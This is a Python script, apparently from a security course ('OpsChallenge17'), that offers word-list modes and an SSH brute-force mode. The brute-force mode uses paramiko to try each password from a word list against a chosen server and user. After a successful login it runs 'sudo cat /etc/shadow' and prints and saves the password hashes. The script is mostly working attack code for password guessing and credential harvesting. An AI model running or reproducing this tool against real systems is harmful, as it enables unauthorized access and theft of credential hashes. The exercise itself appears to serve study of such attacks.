#!/usr/bin/python3

# Script : OpsChallenge17.py
# Purpose: Automated Brute Force

import time
import paramiko

def extract_password_hashes(ssh_connection):
    # Execute command to read the shadow file
    stdin, stdout, stderr = ssh_connection.exec_command('sudo cat /etc/shadow')

    # Read the output and save it to a file
    password_hashes = stdout.read().decode('utf-8')
    with open('password_hashes.txt', 'w') as file:
        file.write(password_hashes)

    # Print the password hashes to the screen
    print('User credential hashes:')
    print(password_hashes)

def menu():
    # Prompt user to select a mode
    selected_mode = int(input('Select a mode (1, 2, or 3): '))

    # Offensive mode
    if selected_mode == 1:
        # Accept file path and open file
        word_list_path = input('Enter file path of word list: ')
        with open(word_list_path, 'r', encoding='iso-8859-1') as file:
            # Iterate through word list and print each word with a delay
            for word in file:
                print(word.strip())
                time.sleep(0.5) # Add 0.5 second delay

    # Defensive mode
    elif selected_mode == 2:
        # Accept input string and file path
        input_string = input('Enter input string: ')
        word_list_path = input('Enter file path of word list: ')

        # Open file and check if string appears
        with open(word_list_path, 'r', encoding='iso-8859-1') as file:
            words = file.readlines()
            found = False
            for word in words:
                if input_string == word.strip():
                    found = True
                    break

        # Print result
        if found:
            print(f'{input_string} was found in the word list.')
        else:
            print(f'{input_string} was not found in the word list.')

    # SSH authentication mode
    elif selected_mode == 3:
        # Accept input IP address, username, and file path
        ip_address = input('Enter IP address of the SSH server: ')
        username = input('Enter username: ')
        word_list_path = input('Enter file path of word list: ')

        # Initialize SSH client
        ssh_connection = paramiko.SSHClient()
        ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through word list and attempt SSH authentication
        with open(word_list_path, 'r', encoding='iso-8859-1') as file:
            words = file.readlines()
            success = False
            for word in words:
                password = word.strip()
                try:
                    ssh_connection.connect(ip_address, username=username, password=password, timeout=5)
                    success = True
                    print(f'Successful login with password: {password}')
                    break
                except paramiko.AuthenticationException:
                    print(f'Failed login with password: {password}')
                except Exception as e:
                    print(f'Error: {e}')
                    break

        # Close SSH connection
        if success:
            extract_password_hashes(ssh_connection)
            ssh_connection.close()

if __name__ == "__main__":
    menu()
